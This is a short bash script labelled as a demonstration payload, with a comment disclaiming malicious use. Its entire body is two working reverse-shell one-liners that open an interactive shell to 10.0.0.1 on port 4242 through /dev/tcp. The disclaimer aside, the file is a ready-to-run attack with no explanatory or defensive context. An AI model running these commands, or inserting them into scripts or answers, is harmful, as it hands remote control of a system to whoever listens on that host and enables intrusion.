#!/bin/bash
# This is an example payload
# Do not use this for maliciuos intent
# This is used for demonstration purposes

bash -i >& /dev/tcp/10.0.0.1/4242 0>&1
0<&196;exec 196<>/dev/tcp/10.0.0.1/4242; sh <&196 >&196 2>&196
